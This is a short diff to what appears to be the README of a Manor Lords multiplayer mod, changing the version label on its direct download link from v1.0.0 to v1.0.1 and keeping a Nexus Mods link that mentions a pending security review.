@@ -31,7 +31,7 @@
 
 ## Download
 
-- **Direct Download (v1.0.0):** [ManorLords_Multiplayer_Mod.zip](https://github.com/p3pabaddon/manor-lords-multiplayer/raw/main/ManorLords_Multiplayer_Mod.zip) (48.7 MB)
+- **Direct Download (v1.0.1):** [ManorLords_Multiplayer_Mod.zip](https://github.com/p3pabaddon/manor-lords-multiplayer/raw/main/ManorLords_Multiplayer_Mod.zip) (48.7 MB)
 - **Nexus Mods:** https://www.nexusmods.com/manorlords/mods/465 *(exact same archive — currently going through Nexus's standard automated EXE security review)*
 
 ---
